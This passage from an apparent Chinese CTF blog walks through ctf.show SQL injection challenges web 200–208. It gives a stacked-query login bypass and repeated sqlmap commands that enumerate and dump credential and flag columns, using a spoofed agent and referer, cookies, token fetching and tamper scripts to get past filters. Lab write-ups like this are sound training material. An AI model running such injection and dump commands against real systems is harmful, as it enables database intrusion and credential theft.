</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在上面语句中，发现没有过滤空格分号，且在查询语句里点明了表名，可以利用表名作为密码</p> <p>用户名登入<code>1;show tables;</code></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>而密码验证是$row[0]==$password，这样查询的返回结果就是当前数据库里的表名ctfshow_user</p> <p>密码登入ctfshow_user即可登录</p> <h2 id="web-201"><a href="#web-201" class="header-anchor">#</a> web 201</h2> <p>开始使用sqlmap了，要求</p> <div class="language- line-numbers-mode"><pre class="language-text"><code> 使用--user-agent 指定agent
 --user-agent=sqlmap
 使用--referer 绕过referer检查
 --referer=ctf.show
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在这里，将一下用到的参数</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>-dump  导出数据
-refer 伪造来源</p> <p>-D ：指定数据库名
-T  指定表名
-C  指定列名
--dbs  查询所有数据库
--tables  查询指定数据库的所有表
--columns  查询指定表的所有列
--dump  查询指定列的所有数据</p></div> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> http://dbc32287-781e-431e-a156-eb530b30e06c.challenge.ctf.show/api/?id<span class="token operator">=</span><span class="token number">1</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span>
<span class="token comment"># 指定数据库来爆表名     ctfshow_user</span>
sqlmap <span class="token parameter variable">-u</span> http://dbc32287-781e-431e-a156-eb530b30e06c.challenge.ctf.show/api/?id<span class="token operator">=</span><span class="token number">1</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
<span class="token comment"># 指定数据库,表爆字段   id,pass,username</span>
sqlmap <span class="token parameter variable">-u</span> http://dbc32287-781e-431e-a156-eb530b30e06c.challenge.ctf.show/api/?id<span class="token operator">=</span><span class="token number">1</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">--columns</span>
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> http://dbc32287-781e-431e-a156-eb530b30e06c.challenge.ctf.show/api/?id<span class="token operator">=</span><span class="token number">1</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">-C</span> pass <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-202"><a href="#web-202" class="header-anchor">#</a> web 202</h2> <p>使用--data 调整sqlmap的请求方式，使用post方式传参</p> <p><code>--data=&quot;id=1&quot;</code></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> https://58dfc63b-06ae-41c7-8892-db41e05ddcf9.challenge.ctf.show/api/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span>
<span class="token comment"># 指定数据库来爆表名     ctfshow_user</span>
sqlmap <span class="token parameter variable">-u</span> https://58dfc63b-06ae-41c7-8892-db41e05ddcf9.challenge.ctf.show/api/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
<span class="token comment"># 指定数据库,表爆字段   id,pass,username</span>
sqlmap <span class="token parameter variable">-u</span> https://58dfc63b-06ae-41c7-8892-db41e05ddcf9.challenge.ctf.show/api/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">--columns</span>
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> https://58dfc63b-06ae-41c7-8892-db41e05ddcf9.challenge.ctf.show/api/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">-C</span> pass <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-203"><a href="#web-203" class="header-anchor">#</a> web 203</h2> <p>使用--method 调整sqlmap的请求方式，使用put方式提交，还要带上header的content-type</p> <p><code>--method=PUT --headers=&quot;Content-Type:text/plain&quot;</code></p> <p>如果加上还是不行，就在url后的api在加上index.php，不知道为什么前面都可以直接用api，这里就要加index.php才能跑了</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> https://71ea3277-4e3a-4a8c-b7cf-dfbcd5a62831.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>
<span class="token comment"># 指定数据库来爆表名     ctfshow_user</span>
sqlmap <span class="token parameter variable">-u</span> https://71ea3277-4e3a-4a8c-b7cf-dfbcd5a62831.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
<span class="token comment"># 指定数据库,表爆字段   id,pass,username</span>
sqlmap <span class="token parameter variable">-u</span> https://71ea3277-4e3a-4a8c-b7cf-dfbcd5a62831.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">--columns</span>
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> https://71ea3277-4e3a-4a8c-b7cf-dfbcd5a62831.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">-C</span> pass <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-204"><a href="#web-204" class="header-anchor">#</a> web 204</h2> <p>带上cookie参数，使用--cookie</p> <p>f12在应用里找到PHPSESSID=xxxx的cookie，只需要值即可</p> <p><code>--cookie=&quot;xxxx&quot;</code></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> https://78628529-78f4-4893-83d7-ca111a1d0e11.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;8tabnpij74cu06necss480g05q&quot;</span>
<span class="token comment"># 指定数据库来爆表名     ctfshow_user</span>
sqlmap <span class="token parameter variable">-u</span> https://78628529-78f4-4893-83d7-ca111a1d0e11.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;8tabnpij74cu06necss480g05q&quot;</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
<span class="token comment"># 指定数据库,表爆字段   id,pass,username</span>
sqlmap <span class="token parameter variable">-u</span> https://78628529-78f4-4893-83d7-ca111a1d0e11.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;8tabnpij74cu06necss480g05q&quot;</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">--columns</span>
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> https://78628529-78f4-4893-83d7-ca111a1d0e11.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;8tabnpij74cu06necss480g05q&quot;</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">-C</span> pass <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-205"><a href="#web-205" class="header-anchor">#</a> web 205</h2> <p>api调用需要鉴权</p> <p>f12打开网络界面，在查询框输入1，可以看到网络调用api时，还请求了一个getToken.php</p> <p><img src="/medias/show-sql/1.png" alt="token"></p> <ul><li>–safe-url:意思是访问目标网址前需要访问的地址</li> <li>–safe-freq是每两次间访问gettoken的次数，设置为一次</li></ul> <p>例如<code>--safe-url http://390b4a5e-c0c5-474e-a544-aa399aeb858c.challenge.ctf.show/api/getToken.php --safe-freq 1</code></p> <p>这一题不能带cookie跑，cookie是变化的，这一次flag的位置不在ctfshow_user表里了，在新的表ctfshow_flax里</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> --safe-url https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
<span class="token comment"># 指定数据库来爆表名     ctfshow_flax</span>
sqlmap <span class="token parameter variable">-u</span> https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> --safe-url https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
<span class="token comment"># 指定数据库,表爆字段   flagx,id,tes</span>
sqlmap <span class="token parameter variable">-u</span> https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flax <span class="token parameter variable">--columns</span> --safe-url https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flax <span class="token parameter variable">-C</span> flagx <span class="token parameter variable">--dump</span> --safe-url https://515213bd-0688-4e01-800c-8df1cbc8faa0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-206"><a href="#web-206" class="header-anchor">#</a> web 206</h2> <p>sql需要闭合</p> <p>sqlmap会自动识别和闭合。也可以手动闭合，–suffix:指定payload后面加的后缀，可以添加多个</p> <p><code>--suffix=&quot;')#&quot;</code></p> <p>打开f12，在查询框输入1，可以看到网络调用api时，还请求了一个getToken.php。和上一题相似</p> <p>直接跑了</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> --safe-url https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
<span class="token comment"># 指定数据库来爆表名     ctfshow_flaxc</span>
sqlmap <span class="token parameter variable">-u</span> https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> --safe-url https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
<span class="token comment"># 指定数据库,表爆字段   flagv,id,tes</span>
sqlmap <span class="token parameter variable">-u</span> https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxc <span class="token parameter variable">--columns</span> --safe-url https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxc <span class="token parameter variable">-C</span> flagv <span class="token parameter variable">--dump</span> --safe-url https://16ec6605-409e-40f0-aad3-0d62d3895baa.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-207"><a href="#web-207" class="header-anchor">#</a> web 207</h2> <p>--tamper 的初体验   tamper绕过空格</p> <p><code>--tamper=space2comment</code>   太好玩辣，就是跑的慢</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> --safe-url https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
<span class="token comment"># 指定数据库来爆表名     ctfshow_flaxca</span>
sqlmap <span class="token parameter variable">-u</span> https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> --safe-url https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
<span class="token comment"># 指定数据库,表爆字段   flagvc,id,tes</span>
sqlmap <span class="token parameter variable">-u</span> https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxca <span class="token parameter variable">--columns</span> --safe-url https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxca <span class="token parameter variable">-C</span> flagvc <span class="token parameter variable">--dump</span> --safe-url https://13340161-ae12-4aca-86c0-d7a4876769c0.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-208"><a href="#web-208" class="header-anchor">#</a> web 208</h2> <p>过滤了select,可以双写绕过或者大写绕过</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//对传入的参数进行了过滤</span>
<span class="token comment">// $id = str_replace('select', '', $id);</span>
  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>看了大佬们是写tamper脚本，不清除这个脚本怎么写，后续可能补上。</p> <p>sqlmap使用是sql语句默认是大写，所以可以使用上一题的payload</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span> --safe-url https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
<span class="token comment"># 指定数据库来爆表名     ctfshow_flaxcac</span>
sqlmap <span class="token parameter variable">-u</span> https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> --safe-url https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
<span class="token comment"># 指定数据库,表爆字段   flagvca,id,tes</span>
sqlmap <span class="token parameter variable">-u</span> https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxcac <span class="token parameter variable">--columns</span> --safe-url https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
<span class="token comment"># 指定数据库,表,字段,列表爆数据</span>
sqlmap <span class="token parameter variable">-u</span> https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--refer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type:text/plain&quot;</span>  <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxcac <span class="token parameter variable">-C</span> flagvca <span class="token parameter variable">--dump</span> --safe-url https://71680709-842f-4fee-b0fe-c4373c516436.challenge.ctf.show/api/getToken.php --safe-freq <span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment
